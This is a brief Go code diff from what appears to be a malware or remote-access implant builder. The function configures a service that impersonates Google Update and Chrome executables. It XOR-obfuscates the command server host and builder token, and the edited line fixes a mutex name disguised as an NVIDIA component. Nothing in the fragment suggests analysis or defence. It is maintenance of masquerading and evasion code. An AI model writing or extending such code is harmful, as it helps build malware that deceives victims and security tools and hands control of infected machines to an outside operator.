@@ -193,7 +193,7 @@ func buildGlobals(cfg Config) (globalValues, error) {
 	displayName := "Google Update Agent"
 	svcExeName := "GoogleUpdate.exe"
 	workerExeName := "Google Chrome.exe"
-	mutexName := fmt.Sprintf("Global\\\\NvDisplayMutex_%s", safeBuildID)
+	mutexName := fmt.Sprintf("Global\\NvDisplayMutex_%s", safeBuildID)
 
 	encServerHost := xorWithKey(cfg.ServerHost, key)
 	encBuilderToken := xorWithKey(cfg.BuilderToken, key)
